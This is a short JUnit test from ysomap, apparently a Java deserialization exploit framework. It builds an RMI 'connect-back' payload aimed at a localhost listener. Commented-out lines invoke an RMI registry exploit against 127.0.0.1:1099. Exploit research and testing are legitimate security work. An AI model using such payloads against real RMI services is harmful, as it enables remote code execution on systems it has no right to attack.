package ysomap.core.exploit.rmi;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.payload.java.rmi.RMIConnectWithUnicastRemoteObject;

/**
 * @author wh1t3P1g
 * @since 2020/5/12
 */
public class NamingTest {

    @Test
    public void lookup() throws Exception {
//        Payload payload = new RMIConnectWrapped();
//        Payload payload = new RMIConnectWrappedWithProxy();
        Payload payload = new RMIConnectWithUnicastRemoteObject();
        Bullet bullet = payload.getDefaultBullet("127.0.0.1:8888");
        payload.setBullet(bullet);
//        Object obj = payload.getObject();
//        Naming.lookup("rmi://127.0.0.1:1099/Hello", obj);

//        RMIRegistryExploit RMIexploit= new RMIRegistryExploit();
//        RMIexploit.target="127.0.0.1:1099";
//        RMIexploit.payload=obj;
//        RMIexploit.run();
    }
}